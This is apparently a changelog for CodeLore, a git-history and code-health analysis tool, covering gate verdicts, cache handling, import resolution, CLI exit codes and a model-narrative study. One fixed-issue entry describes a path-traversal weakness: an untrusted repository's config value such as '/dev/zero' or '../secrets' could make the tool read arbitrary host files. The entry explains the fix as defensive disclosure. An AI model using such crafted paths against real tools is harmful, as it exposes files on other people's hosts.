...
- **`CODELORE_CACHE_DIR` sets the cache root for every command.** `--cache-dir` existed but each command had to be told separately, and `diff` has no such flag at all, so a container or a shared CI image had no single place to point the fact store. Precedence is the flag, then the environment variable, then the OS cache location. The gap showed up first in this repository's own test suite: a test that forgot the flag wrote into the developer's real cache directory under a key derived from a fixture path in a temporary directory that is deleted moments later. Nothing reclaims those entries — eviction counts fact stores, and most of what a gate test leaves behind is a ledger — so they accumulated one hashed directory per fixture per run, permanently. The suite now points every subprocess at a scratch root, and the two tests that recomputed the cache location in-process are pointed at the same one, since resolving it there looked somewhere the binary never wrote.

- **A third model-study leg lands, and with it the study's first paired per-item difference.** The contributed frontier-model run was repeated over the same six repositories and the same 204 files under the current prompt, with `temperature 0` and `seed 42` transmitted and the gateway API key rotated per generation so a per-key response cache could not make repeated prompts look deterministic. Because legs 2 and 3 share every file, their first-generation verdicts can finally be subtracted: 10 grounded in both, 183 in neither, 11 discordant (7 gained, 4 lost), exact McNemar **p = 0.549**. The prompt hardening did not move groundedness detectably, and the instrument the pre-registered protocol asks for now exists — measuring the prompt axis rather than the model axis it was designed for, since leg 1 still shares no file with either. **Pinning did not buy determinism**: run-pair verdict agreement is 92.6–96.1% here against 93.1–96.6% unpinned, indistinguishable and marginally worse at the low end — which directly contradicts leg 1, where repeat generations were byte-identical in 110/110 items under the same nominal pins. The pins are the same and the serving path is not, so determinism is a property of that path rather than of the temperature setting; three generations per item stay necessary, and any leg assuming otherwise would be measuring its own assumption. Token volume is unchanged (9.03 → 8.94 uncited tokens per narrative). The leg is published with its provenance stated as weaker than leg 2's: that leg shipped a raw run log its figures were reconciled against independently, this one did not, so it is reconciled only against itself.

### Changed

- **The code-health gate no longer passes on a scan that reached a minority of the repository.** Scan coverage has been measured and warned about for a while, but the `degraded` verdict never consumed it: the emptiness witness asks whether the health set is empty, and a partial scan is not an empty one — so a run that scored forty of two hundred eligible files returned rows, reported `passed`, and described only the part it happened to measure. The scan now records its own `eligible` and `scored` counts into the fact store's `provenance` table, and the gate classifies them against the same floor the disclosure warning uses. The counts live in `provenance` rather than in an ingest statistic because the gate runs on cache hits, where the scan never re-executes — the store *is* the cache, so a row there survives what an in-memory counter does not. The denominator is the scan's own eligible count rather than a HEAD-tree ratio, which would fire spuriously under `--after`/`--before`, where attempting fewer files than the tree holds is correct. The verdict is not a boolean: a store predating the keys reads `Unknown` and a source-less tree reads `Vacuous`, both distinct from `Met` and `Below`, because reading absence as met greens a blind run while reading it as below fails a correct one — and a half-written or unparseable pair reads `Unknown` too, so a storage fault cannot manufacture a failure. `fail_on_degraded` already defaulted true, so wiring the signal is what converts the existing disclosure into enforcement. Two distinct causes now reach the `degraded` verdict — an empty scan on a non-empty repository, and a scan that covered too little of it — so the violation records which one fired and its counts rather than reporting `no-data` for both; `no-data` is only true of the first, and the second returns rows by definition. `CACHE_EPOCH` moves to `schema_v22`: existing entries hold correct facts but cannot say what their scan reached, and a cache hit never re-runs the scan that would record it. The key already folds in the package version, so a released upgrade orphans them anyway; the bump is what reaches same-version builds of `main`, which would otherwise keep greening on partial coverage at an unchanged HEAD.

### Fixed

- **Python and Java import resolution scanned every tracked file once per import statement.** Both resolvers answer "which tracked file ends with this suffix, and is it unique?", and both did it by walking the whole live-path set for every edge — `O(edges x files)`. On a fifty-thousand-file Java repository with half a million imports that is tens of billions of string comparisons before a single analysis runs, and in Python every `import os` paid it too, only to resolve to nothing. Only a path whose final segment matches the target's can possibly match, and that segment is known before the search, so the live set is now grouped by final segment once per resolution pass and each edge walks the few files sharing a basename. The predicate applied to each candidate is untouched, so the refusal that matters is preserved exactly: two matches still yield no edge rather than a guess, which is what stops a repository with the same class under two source roots from getting a fabricated dependency. Rust and JavaScript resolution is unchanged — both build candidate paths and hash them, which was already constant-time. The published resolver functions keep their signatures and their scanning implementations; only the in-crate callers, which are the ones running over whole repositories, take the indexed path. Equivalence was measured rather than argued, twice: a unit test asserts the indexed and scanning answers agree on every shape either resolver branches on, including two genuine ambiguities and a partial-segment near-miss; and both binaries were run over a fixture built to exercise the changed paths, where nine graph analyses came back byte-identical. That fixture was checked first for the trap that makes such a proof worthless — it does produce Python and Java edges, so the witness can see what it is being asked to certify.
- **Five argument mistakes exited as something other than an argument error, two of them only after the ingest.** The documented table reserves exit 2 for CLI and argument errors, and these did not use it. `--format parquet` without `--output` returned the output-error code, while the sibling check on the same flag and the same formats — `--output -` — already called the same mistake an argument error; nothing is written or attempted in either case, so the two now agree. `--time-bucket` on an analysis that cannot bucket returned the analysis-error code while its composite-format twin twenty lines away returned the argument one. A malformed `--exclude` glob was compiled during the walk, so the user paid a full ingest to hear that a bracket was unclosed; the pattern is now compiled at the boundary where it was typed. `--min-coupling 150` was accepted because both coupling percentages are held as `u8` and only their ordering was checked, so a pair that can select nothing produced a clean empty table. `--rows 0` asked for a report with no rows and got one. And `explain <path>` under a `--repo` that does not exist reported an unknown *topic* and pointed at the topic list — no path can resolve under a missing repository, so it now names the repository. The `--thresholds-file` help text is corrected in the same pass: it promised that a missing file passes vacuously, which is true of the auto-discovered file and not of one you named, where the vacuous pass would turn a typo into a green gate. Two existing tests pinned the old codes and are updated with the reason recorded beside them. **This can change the exit code a script keys on**, in each case from an undocumented one to the documented one; verdicts and messages are otherwise unchanged. The new range checks were lifted into their own function rather than suppressing the line-count lint they tripped.
- **Every generated dashboard was titled after the tool and headed by the literal `--repo` argument.** That argument is usually `.`, so a report published to a Pages site, attached to a build, or opened beside three others read `CodeLore Dashboard` over a header saying `.` — nothing in the document said which repository it described. The header now carries the canonical path and the document title leads with the repository's name, which is what a browser tab and a shared link show. The same derivation covers the step-summary emitter, which had the same two lines. Two smaller things in the same head: the report embeds an inline SVG icon, because without one the browser requests `/favicon.ico` from whatever host the file was opened from and logs a 404 on every view; and it now carries the standard `mobile-web-app-capable` meta alongside the `apple-` prefixed one it had, which Chrome logs a deprecation warning for on its own. Both were console noise on the first impression of a report someone was asked to trust.
- **The memory ceiling could be set higher than the machine had.** Every DuckDB connection was given a fixed 4 GB `memory_limit`, on the reasoning that a ceiling makes the engine spill to disk instead of growing without bound. DuckDB's own default is a fraction of detected physical memory, so on any host below roughly five gigabytes the fixed value *raised* the ceiling: the engine then believed it could hold four gigabytes of join state, declined to spill at the point it otherwise would have, and the kernel's out-of-memory killer arrived instead of a spill file. Small self-hosted runners and container memory limits are where that bites, and it is exactly backwards from the reason the lever exists. It is now applied only when it lowers the ceiling; otherwise the engine's own value stands and only the spill directory is set. The engine was measured rather than assumed on both points that decide this: it does **not** clamp a limit to physical memory (`64GB` on a 24 GiB machine reads back as `59.6 GiB`, and `100GB` as `93.1 GiB`), so the raised ceiling was real; and it reads `GB` as a power of 1000 while reporting `GiB` as a power of 1024, so the size parser keeps the two apart — treating them as one unit would misjudge every comparison by seven percent, and the first version of this fix did.

- **The shipped pull-request workflow template could not have worked, and three strings said things that were not true.** `examples/.github/workflows/codelore-pr.yml` checks out the pull request's own branch and then asks for a diff against `github.sha`. On a `pull_request` event that variable is the synthetic *merge* commit, a ref a head-branch checkout never fetches, so `git rev-parse` fails and every one of the three `codelore diff` steps dies before doing any work. The template's own comment says `origin/main...HEAD`, `examples/README.md` documents `origin/<base>...HEAD`, and this repository's own CI uses `...HEAD` — the file was the only place that said otherwise. All three ranges now end in `HEAD`, with the reason recorded beside the checkout that makes it the right answer. The same file requested `pull-requests: write` for a "sticky comment on quality-gate failure" step that does not exist anywhere in it; the scope is dropped, with a note to add it back alongside a step that needs it. Then three strings: the hotspots census warning was assembled without line continuations, so it reached the terminal with runs of ten spaces inside the sentence; the banner module advertised a `--banner` flag that has never existed, where the only flag is `--no-banner`; and the Action's `args` input is documented as "appended verbatim" while it is split on whitespace with no quote handling, so `--exclude "some dir/**"` arrives as three arguments and is rejected. The limitation is now stated where the input is described, with the two ways around it.

- **A contributor named Claude, Devin or Cody was counted as an AI assistant.** AI-assistance detection matched product names as substrings of the whole commit message, so `Co-authored-by: Claude Dubois <claude.dubois@example.com>` read as an Anthropic trailer — and Claude, Devin and Cody are ordinary given names. A team with one of them had every pair-authored commit classified `ai-assisted`, which feeds the dashboard's AI lens, the hotspot `ai-pct` column and every AI split in the author-aggregating analyses. Quoting a trailer in prose counted too, so a commit documenting the convention, or a revert of one, was itself marked AI-assisted. Detection now parses the `Co-authored-by:` trailers and requires the assistant's product name to *be* the co-author's name rather than merely begin it, allowing the agent suffixes the vendors actually publish — `Claude Code`, `Cursor Agent` — while `Claude Dubois` is a person. Trailer keys are matched case-insensitively, since all three capitalisations occur in the wild. The bot patterns are applied to each trailer identity as well, which is what keeps machine accounts like `devin-ai-integration[bot]` detected now that the name match is anchored: those names carry the product token as the prefix of a longer machine name, exactly the shape the anchoring rejects. That also makes `.codelorebots` reach co-authors, so a project's own AI account is classified through the mechanism that already exists for it. Aider stays a plain substring match because it tags the message body rather than adding a trailer, and no person is called `(aider)`. Every previously-detected assistant is still detected — the existing signature tests pass unchanged — and the four false-positive names are asserted to stay human. `CACHE_EPOCH` moves to `schema_v25`: attribution is computed during ingest and stored, so a cache hit would keep serving the old classification.
- **Two documentation claims that the code does not support.** The path-filter module said it honoured "parent-directory `.gitignore`s" and "per-directory inheritance". It reads exactly three files, all at the repository root, so a monorepo whose real exclusions live in `packages/*/.gitignore` has those trees analysed as ordinary source — and the numbers, not a warning, are where that shows up. The prose is corrected and the behaviour recorded as a finding rather than changed here: reading nested files has to reach the cache key, which digests a fixed list of ignore-file paths precisely so that editing one invalidates the store, and making that set a function of a tree walk is a design question rather than a longer list. Separately, the only documented CI caching recipe could never hit: it wrapped `--cache-dir` in `actions/cache` "to persist across PRs", but the fact-store key includes the HEAD SHA, so a restored cache misses on every new push and helps only a re-run of the same commit. The artifact that does persist across pull requests is `diff --base-cache`, keyed on the base revision, and the section now shows that recipe instead.
- **A damaged cache entry failed every run on that HEAD, permanently.** A cache file that would not open propagated the error, and the key is a pure function of the repository path, HEAD, the options, the package version and the epoch — so the next run recomputed the same key, reopened the same broken file and failed the same way, with nothing in the message to suggest that deleting a file would fix it. A killed writer or a full disk was enough to wedge a repository until someone found the file by hand. The entry is now discarded and the run continues into the ingest: everything in it derives from HEAD and the options, so it can simply be recomputed, and the discard is logged rather than silent. The same restructure closes the narrow window where a concurrent prune evicted the entry between the existence check and the open. Separately, the in-flight temp file now carries a timestamp alongside the process id. A PID is unique only within one PID namespace, and the line that clears the temp name deletes whatever holds it — two containers sharing a mounted cache volume routinely run as the same low PID, so that delete could land on another container's live database rather than on a leftover of this run's own. The stale-artifact sweep matches on the `.duckdb.tmp` infix and is unaffected by the longer name.

- **Three routes through `analyze` answered a mistyped argument with an empty result and exit 0.** Each had its own reason, and each ended in the failure mode a behavioural tool can least afford — a green CI step over a repository that was never read. `--analysis clones` short-circuits before the repository is opened, on purpose: clone detection is a working-tree walk that needs no history, so the branch exists to serve shallow clones and directories that are not git repositories at all. Skipping the *git* checks is the point of it; skipping the *path* checks was an oversight, so a `--repo` typo walked nothing, found nothing, and printed a header row, while an `--output` whose parent directory was absent surfaced as a bare `No such file or directory` with the unclassified exit code rather than the documented output one. Those two checks now run on that branch as well, sharing the classifiers the full pre-flight uses so "missing" and "unreadable" stay distinct on both routes. `ingest-sarif` never opened `--repo` either, and its sidecar is addressed by a hash of that path, so a typo did not fail — it stored the findings under a repository that does not exist, reported success, and left every later overlap analysis and findings gate correctly saying nothing had been ingested. Third, `--target` was checked only inside the analysis: a path naming no tracked file returned an empty table, which is the right contract for a *tracked* file that happens to have no functions and the wrong answer for a typo. The check now runs at the boundary, against the opened repository and before the ingest, which also moves a missing `--target` from an analysis error charged after the walk to an argument error refused before it. That check is the one the MCP tools have applied since they were written; rather than write a second copy, the tool now calls the CLI's, so the two surfaces cannot drift on what counts as a known path. A tracked file outside the function analyser's languages still returns an empty table, because that is a real empty result rather than a mistake — it now says so instead of leaving a bare header row to be read as "no functions here". All five behaviours were observed against the built binary before the fix: exit 0 for the clone path, the SARIF ingest and the untracked target, exit 1 for the unwritable output, and exit 4 for the missing flag.
- **A failing `codelore diff` could exit 1 with nothing on stderr at all.** `check` and `gate` print their verdict on stderr in every mode, on the reasoning that a verdict is run metadata and stdout is the report document. `diff` never adopted it: with `--output FILE` the whole story went into the file and the process exited 1 silently, so in the Action the step turned red with a blank log and the reason was visible only to whoever opened the artifact. A failing run now names the violation and finding counts and points at the report it wrote; a passing run says so only when something was actually gated, since an advisory run — no thresholds file, `--fail-on none` — gated nothing and is the common invocation. Two more things the PR-mode reader was told wrongly go with it. The markdown footer printed **✅ No new behavioral findings** directly beneath a table of functions whose health had just degraded: "no findings" is about the four behavioural lists, and the delta-health verdict is a fifth signal that `--fail-on` deliberately does not gate on (`deny_degrading_verdict` does), so under a degrading verdict the footer now says that and how to gate on it, keeping the check mark for runs that earned it. And the text header's *"(N files changed)"* was not the number of files changed — it summed three finding lists, so a pull request touching forty unremarkable files reported zero, and the same range reported a different number as `--top-n` moved. It now reports the changed-file set the analyses are filtered against, which is already computed; the count is carried in the JSON document too. Finally, an unresolvable rev forwarded git's bare *"Needed a single revision"*, which does not distinguish the two causes that dominate in CI — a base branch the runner never fetched, and a checkout too shallow to contain the rev — and those have opposite fixes, so both are now named.
- **A shallow checkout failed with a missing-object error that reads as repository corruption.** `actions/checkout` fetches depth 1 by default, so this is the most common way a CI run meets CodeLore — and the documentation has always said `fetch-depth: 0` is mandatory. What the binary said when it was not set depended on the shape of the history. A shallow clone whose tip is a *merge* commit ingests zero commits under the default merge filter, and the ingest witness catches that with a message naming the truncation and the remedy. Ordinary *linear* history gets further: the walk reaches the boundary commit, asks for a parent the clone does not contain, and surfaces gix's own `find_parent_commit <sha>: An object with id … could not be found`. Same cause, same exit code, and a diagnosis that sends the reader looking for a damaged object database instead of at the checkout step above. The walker now distinguishes the two: a parent that is missing on a shallow clone is reported as truncated history, naming both `git fetch --unshallow` and `fetch-depth: 0`, while a missing parent on a full clone keeps the original message, because there it really does mean the object database is damaged. Only the failure path pays for the shallow probe. The existing merge-tip test is joined by a linear-history one, so both shapes of the same truncation are pinned to the same remedy.

- **`analyze` contradicted every other command about the same `--repo` path.** The pre-flight gate that runs before the ingest asked `Path::exists`, which answers `false` both for a path that is not there and for one whose metadata cannot be read at all — and it returns before the backend it guards, so the three-way distinction the backends draw in `open` never reached it. A directory inside an unreadable parent was therefore reported as absent by `analyze` and as a permission error by `check`, `gate`, `diff` and `explain`, which have no pre-flight and go straight to the backend: one tool, one path, two diagnoses, and the wrong one told the user to create a directory that is already there while offering to `git init` inside it. The gate now classifies the path the same three ways the backends do, and carries its own pre-flight state for the unreadable case so the banner says the path cannot be read rather than borrowing the missing-path wording and its remedy. The `--output` parent check on the next screen had the identical fault — an unreadable parent reported as a missing one — and takes the identical fix; its absent-parent message is reused verbatim rather than rewritten, so the only case whose wording moves is the one that was previously wrong. Both classifiers are asserted directly, including that an unreadable path is not reported as a missing one, and the pair was probed by restoring `exists` underneath them: that fails exactly those two assertions and leaves the behaviour-preserving ones green, so neither can pass against the bug it exists to catch. The cache lookups nearby keep `exists` deliberately — there "cannot tell" and "not there" both mean recompute, whereas on a diagnostic path they are different faults with different fixes.

- **A mistyped `--repo` path was reported as "not a git repository".** Only `analyze` distinguished the two: its pre-flight checks the path before opening, so it says the directory does not exist. Every other surface — `check`, `gate`, `diff`, `explain` — went straight to the backend, which reports the same not-a-repository error whether the path is a typo or a real directory without a `.git`. Those are the CI and pre-push surfaces, so the worst diagnosis sat where the audience is least able to act on it, and it sent people looking for a missing `.git` directory that was never the problem. The distinction now lives in both backends' `open`, so a caller that reaches them inherits it instead of re-implementing a pre-flight of its own. The check uses `try_exists` rather than `exists`: the latter answers `false` when the metadata cannot be read at all, so an unreadable directory would be reported as absent — the same conflation this change removes, one layer down. Three states are now distinct, and all three were exercised against a built binary: a path that is not there, a path whose metadata cannot be read (which reports the permission error), and a directory holding no repository, which still reports exactly what it did before. The cache code nearby keeps using `exists`, correctly — for a cache file "cannot tell" and "not there" both mean recompute, whereas here they are different problems with different fixes. Both backends change together and a differential test asserts they agree, since the CLI backend is only an oracle if it fails the same way.

- **The import graph was severed at every Cargo workspace boundary.** A bare `use` path is an extern crate in Rust 2018+, and the resolver treated all of them as third-party dependencies with no source to point at. That is right for `serde`, and wrong for a workspace's own members: `use codelore_lib::analyses::hotspots` from the CLI crate names a file three directories away, and every such edge was dropped. On this repository that left 11 of the 12 CLI source files with no outbound edge at all, and every graph analysis — `instability`, `centrality`, `dependency-cycles`, the architecture family, and `god-classes`' fan-in term — described the disconnected result as the structure of the code, with `max_propagation_cost` gating a graph missing those edges. Bare paths now resolve against a sibling member's `src/`, derived from the importer's own position in the tree rather than from the workspace manifest: a file in `crates/<member>/src/` has its siblings one level up, which keeps the resolver pure and lexical and the lookup constant-time instead of a live-path scan per import. Both spellings of the member directory are offered, since a crate name and its directory may differ by the underscore/hyphen swap. Nothing asserts the sibling exists — the assembled path is matched against the live-path set exactly as before, so a genuine dependency finds no candidate and stays unresolved. Anchoring on the importer's `src/` also scopes this to crate sources on purpose: a file under `tests/` gains no sibling root, because an integration test importing the library it exercises is a build-time fact rather than an architectural dependency, and counting those edges would give every library file afferent coupling from its own test suite. Measured on this repository, the change adds edges without moving any gate: propagation cost 0.0104 → 0.0122 against a 0.10 ceiling, and the cycle count is unchanged. `CACHE_EPOCH` moves to `schema_v24` — resolution happens once, at ingest, so a cache hit would keep serving the severed graph.

- **The HEAD scans loaded whole blobs in order to discover they were too large to use.** Every HEAD-time pass caps file size before handing a blob to tree-sitter, and all four learned the size by reading the entire blob first — so a file the very next line discarded was materialised in full. Three of those passes run under `into_par_iter`, so the allocation was per worker: a committed multi-hundred-megabyte bundle cost that much resident memory, times the worker count, to be told it was generated code. The fix already existed in this repository — the history walker probes `find_header` and rejects an oversize diff blob "without ever allocating its bytes", added after a vendored database file allocated a copy per thread — and this extends the same idea to the passes that never got it. `BlobReader` gains a `read_capped` method whose default implementation reads and then measures, which is exactly the old behaviour: backends that cannot answer from object metadata are unchanged and unaffected, which is why it is defaulted rather than required. `GixRepo`'s reader overrides it with the header probe, and the tree walk that decides which paths exist is now shared by both methods so they cannot disagree about existence while disagreeing about cost. Output is unchanged: the oversize skip, the not-tracked skip and the object-database-error loss keep their three distinct outcomes, so scan-coverage accounting is untouched, and the import graph and code-health row set over this repository are identical either side of the change.

- **A mistyped input-file path failed differently depending on the cache.** The four explicitly-named inputs — `--group-file`, `--team-map-file`, `--calibration`, `--defect-calibration` — are hashed by *content*, and the hasher treats an unreadable path as "no override". A typo therefore did not surface as a typo; it silently became the run that named no file at all. The consequence then splits by flag. `--group-file` and `--team-map-file` fold into the ingest cache key, so the typo collapsed it onto the un-overridden run: on a cold cache that surfaced as a clean read error naming the missing path, but on a warm one it hit that entry and failed much later and much worse, with a missing-table catalog error and a SQL caret from the query layer — the same command, the same typo, two different exit codes and two unrelated diagnoses. The two calibration flags are deliberately analysis-only and never split the ingest key, so they fail more quietly rather than more loudly: the corpus-percentile lens simply goes inactive, and the notice that would have reported an inactive lens is suppressed precisely because a path *was* named. All four are now checked for existence at the CLI boundary, beside the `--temp-dir` check that already establishes the pattern, so both paths report the same thing at the same point. Only the explicit flags are validated: the auto-discovered siblings are absent in most repositories, and being absent is what "no override" legitimately means for them.
- **A repository could point CodeLore's calibration reader at any file on the host.** `[calibration] defect_artifact` is read out of the *analysed* repository's own `.codelore-thresholds.toml`, so it is attacker-controlled whenever that repository is untrusted — and it is consumed on the plain `analyze --repo <clone>` path as well as by `check`, `gate`, `explain` and the MCP server at startup. An absolute value passed through verbatim and a relative one was joined to the repo root with no containment check, so `/dev/zero` bought an unbounded read and any other path an existence-and-shape oracle. The value is now confined to the tree that declared it: absolute paths and `..` components are both rejected, as a value-level problem alongside the existing range checks, so the offending key is named and the run exits in the configuration bucket rather than failing later somewhere in the reader. `..` is rejected outright rather than normalised and re-checked, because the lexical normaliser used for import resolution pops on an empty stack — `../secrets` collapses to `secrets`, which would pass a starts-with test while naming a file outside the tree. The check sits in a helper beside `finite_in`/`finite_min` rather than inline, which is both the established shape for a per-key check here and what keeps `validate` under the function-length lint.

- **A mistyped input-file path failed differently depending on the cache.** The four explicitly-named inputs — `--group-file`, `--team-map-file`, `--calibration`, `--defect-calibration` — are hashed by *content* into the cache key, and the hasher treats an unreadable path as "no override". A typo therefore did not merely go unnoticed: it collapsed the key onto the run that named no file at all. On a cold cache that surfaced as a clean read error naming the missing path, but on a warm one the typo'd run hit the un-overridden entry and failed much later and much worse, with a missing-table catalog error and a SQL caret from the query layer — the same command, the same typo, two different exit codes and two unrelated diagnoses. All four are now checked for existence at the CLI boundary, beside the `--temp-dir` check that already establishes the pattern, so both paths report the same thing at the same point. Only the explicit flags are validated: the auto-discovered siblings are absent in most repositories, and being absent is what "no override" legitimately means for them.

- **A deeply-nested `use` tree could abort the whole ingest.** The Rust use-tree expander is the one recursive walker left in a module whose own header advertises the iterative `TreeCursor` pattern its siblings were deliberately converted to, and it descended `scoped_use_list`, `use_list` and `use_as_clause` with no depth bound. The byte cap these files already pass through exists to turn deeply-nested generated code into a graceful skip, but it bounds *size*, not *depth*: a source file nesting `use a::{a::{ … }}` far enough sits well under two megabytes and still exhausts the stack of the rayon worker running the HEAD scan. That is an abort rather than a skipped file — it takes the process with it, and no error type can catch a stack overflow, so the failure is invisible to every guard the ingest has. The expander now carries a nesting bound; past it the remaining subtree is dropped and the file keeps whatever targets were already collected. Real declarations nest three or four levels, so the bound sits two orders of magnitude above legitimate code and the import graph over this repository is unchanged either side of the fix. The regression test is paired: one case drives a tree deep enough to be dropped, and a second expands a moderately-nested tree in full, so an empty result in the first cannot be mistaken for the parser never having seen a `use` declaration at all.

- **Two tests that could not fail are gone or made real.** The knowledge-shares idempotence test called `materialize` twice and asserted the row count was unchanged — but the build-once guard returns early on the second call, so nothing ran between the two counts. It could not distinguish a working guard from an absent one, and could not even witness the `CREATE OR REPLACE` determinism it appeared to check, while paying a full fixture ingest to assert that a no-op changed no rows; the in-crate drop-and-observe test is the real proof and remains. Separately, the code-maat parity suite's `normalize` helper had the same shared-helper vacuity that was recently closed for `parse_summary_csv` next door: both sides of the comparison run through it, so a CSV that lost its header collapses each side to the empty set and reports parity having compared nothing. It now refuses an empty parse. That floor would itself have been unreachable — both parity tests are `#[ignore]`d behind an env var — so a `#[should_panic]` test drives it directly on every build.

- **A cache hit now discloses that the store it serves came from a partial scan, to every command rather than one.** The counts the HEAD scan records exist because a cache hit never re-runs the scan that would warn about them — but only `check` read them back, so the identical store produced a `degraded` verdict there and unqualified rows from `analyze`, `diff` and `mcp`. Same store, same blindness, opposite disclosure. The warning now sits in the cache-hit branch beside the dirty-worktree caveat, which established that surface for exactly this kind of "the store you just opened has a limitation you cannot see" fact; putting it there means the three other commands are served without any of them needing to know coverage exists. It is deliberately not gated on an interactive stderr, unlike its neighbour: that gate is there because the dirty check costs a walk over every tracked file, whereas this costs two point selects — and the non-interactive path is where it matters most, since a CI job reading hotspot output has no other way to learn the scan covered a minority of the repository. The message is returned rather than printed so its counts are asserted against a real store.

- **A repository that is mostly generated no longer reads as fully scanned.** The HEAD complexity scan computes two distinct blindness measures on adjacent lines — the loss ratio, and an oversize majority deliberately excluded from it because a generated bundle is not a file the scan owed anyone — and only the first was persisted. So a tree of five real source files beside five hundred minified ones stored five of five eligible, met the coverage floor, and reported complete coverage of a table describing a minority of what looks like source. The skipped count is now stored alongside, and the verdict applies both predicates. The two states stay distinct rather than collapsing: they carry different pairs, and quoting scored-against-eligible for an oversize majority would print *complete* coverage on a run degraded precisely because it is not — and they have different remedies, since a thin scan lost files a re-ingest recovers while an oversize majority lost nothing and is fixed with an ignore rule. Loss is reported first where a repository is both. A store predating the new key reads zero rather than absent, so silence cannot manufacture a failure. **This can turn a previously passing run red** on a mostly-generated repository; `fail_on_degraded = false` keeps the disclosure without the failure. `CACHE_EPOCH` moves to `schema_v23`, since a cache hit never re-runs the scan that would record the new counter.

- **The scan-coverage floor now reaches every gate that reads the thin table, not only `code_health_min`.** The verdict was consumed inside the code-health evaluator, below that gate's own early return, so a threshold file configuring any other complexity-derived gate never reached it — for those configurations the enforcement was not weakened, it was absent, and `cognitive_max` on a blobless clone scoring forty of five thousand files passed clean. It is now applied once where every gate's record exists. Ten of the eleven gates qualify, including the architecture ones: `import_graph` selects its node set directly from `complexity_metrics`, so a thin scan shrinks the graph and reports *fewer* cycles, which is the reads-thinner-as-better shape the floor exists to catch. `disallow_clone_type_1` is the sole exemption, since clone detection runs its own HEAD scan that this figure says nothing about. A skipped gate stays skipped — it evaluated nothing, so there is nothing to distrust — while both passing and failing gates become degraded, keeping the precedence code-health used while it owned the rule. The classification sits against the destructure that already fails to compile when a gate is added, so the edit that wires a new gate is the edit that must decide whether it reads complexity. **This can turn a previously passing run red**: `fail_on_degraded` defaults true, and set it to `false` to keep the disclosure without the failure.

- **The degraded code-health notice now says how thin the scan was, on the path where that is the only thing left to say.** Wiring the coverage floor into the gate moved the `scored`/`eligible` counts onto the violation record, which is the better surface — structured, reaching SARIF and PR annotations, and able to name which of the two degraded causes fired. But a violation is only pushed when `fail_on_degraded` is failing the build, and opting out of the failure is exactly what an operator does when they want the diagnosis without the red run. Those runs kept the verdict and lost the magnitude, which is the number that decides whether to investigate or ignore: "too thin to judge" does not distinguish a scan that missed one file from one that missed nine hundred. The stderr notice fires on both paths and now carries the counts. `GateRunRecord` was deliberately not widened to route them — it is constructed at well over a dozen sites and every other gate would carry a field it never sets — so the notice reads the verdict where it is emitted, through the same `thin_scan_coverage` helper the gate uses, which keeps the two from describing one scan differently. The message is built by a pure function and asserted, including that a partial scan is never reported as having returned nothing.

- **The knowledge-share build-once guard now carries the options it was built under, and is invalidated when its source changes.** The `knowledge_shares` and `doe_scores` temp tables are built `FROM` whichever source `time_bucket` and `use_canonical_lineage` select, but the guard was a bare boolean — so a second caller with different options would have been handed tables baked under the first caller's source and told it was a cache hit. No caller currently diverges on those fields, so this was a latent trap rather than a live defect; it is fixed as consistency rather than speculation, because the correct shape already existed three fields away in the same struct, where the `changes_bucketed` guard is keyed on `(unit, lineage)` precisely so one run can want two bucketings. The same audit found a second gap in the mechanism: the invalidation that runs after a `changes` swap reset the lineage and bucketed guards but not this one, though the shares tables read the very table being swapped — they would have survived a path-set change they were not built against, and are now invalidated alongside their source.

- **The comment-hygiene guard now reaches the manifests and the vendored fork's published readme.** It forbids phase markers and audit IDs across `.rs`/`.sql` under the lib and CLI `src`/`tests` roots — a set that reaches manifests neither by extension nor by path, since they sit at crate root. Manifests carry prose comments of exactly the kind the rule polices, and `codelore-rca/Cargo.toml` sets `readme = "UPSTREAM.md"`, so that file is the text crates.io publishes while no doc guard scans it either (those cover `README.md` plus `docs/**`). The guard now takes an explicit file list beside its directory roots, and asserts that every scanned path — root directories and named files alike — exists: a path that moves would otherwise stop being scanned while every test stayed green, and the emptiness check cannot catch it, because the surviving roots keep the file list populated. The vendored fork is covered at manifest level and left alone at source level — the split is provenance, not crate: the manifest's grammar pins and node-ID annotations are codelore-authored, while the `src/` tree beside it is upstream MPL code. Its upstream issue references (`#528`, `#1183`) are outside every rule here regardless, since the guard bans `F`/`T`-prefixed IDs and `Plan`/`Task`/`DEEP` phase markers rather than bare `#`-prefixed numbers.
...
- **The narrative-evidence doc gained a second model-study leg: a frontier model over 204 files drawn from six external repositories, contributed by GitHub `@Xxx91n` and published with its own committed per-item record.** The headline is a 6.9% first-generation `grounded ✓` rate against leg 1's 65.5%, and the section's first job is to stop that nine-fold gap from being read as a model-quality verdict. The two legs share **no file** — leg 1 narrates this repository, leg 2 narrates ripgrep, typer, bat, hono, gson and express — so model, corpus, host and prompt-time all move together between them, and the largest identifiable driver is numeric verbosity rather than faithfulness: the frontier model emits 11.69× more uncited tokens per narrative, and a checker that flags a narrative when any single quoted number fails to match is close to a per-token race, which a wordier model loses far more often at equal per-token faithfulness. The blind-spot table's independent measurement of the same two models on a different corpus and metric lands at the same order. Because the corpora are disjoint, this is explicitly **not** the paired frontier leg the first study's limits paragraph calls for — no paired per-item difference is defined against it, and that requirement stays open and canonical where it already lived. Two further pins are absent by construction and recorded as such: the client sends only `model` and `messages`, so temperature and seed were never transmitted, and `--llm-refresh` rewrites a single cache key per generation, so only the third narrative survives on disk and leg 1's byte-identity result cannot be reproduced here (verdicts are complete, so the flip rate is unaffected). Every rate, denominator and per-repository count was recomputed from the contributor's raw run log rather than accepted from the submission, and every figure the section publishes is recomputable from the two committed records.

- **A study aggregate's token basis is now stated with the aggregate rather than inherited from the leg that introduced it.** Leg 1's record aggregates the uncited tokens its stamp *names*, and the stamp previews at most five — sound where truncation is rare, which it is there (3 items of 110, moving the mean 0.77 → 0.75). Applied unchanged to a verbose model it silently biases: leg 2 truncates on 150 items of 204, where the stamp-named count understates the token total by 2.09×. Both records preserve the residue as a trailing `…+N` marker, so the true count is recoverable, and the new section's token figures use the recovered total. The generalisable point is recorded beside the numbers: a convention validated on a terse model is not automatically safe on a verbose one.
...
- **The GitHub Action now surfaces the gate verdict it already computed.** `codelore check` and `codelore gate` have always written `result=pass|fail` and `violations=N` to their step output, but the composite action never declared them, so a calling workflow could branch on the exit code and nothing else. Two new action outputs — `result` and `violations` — pass the step outputs through; empty for `command: analyze`/`diff`, which emit no verdict.

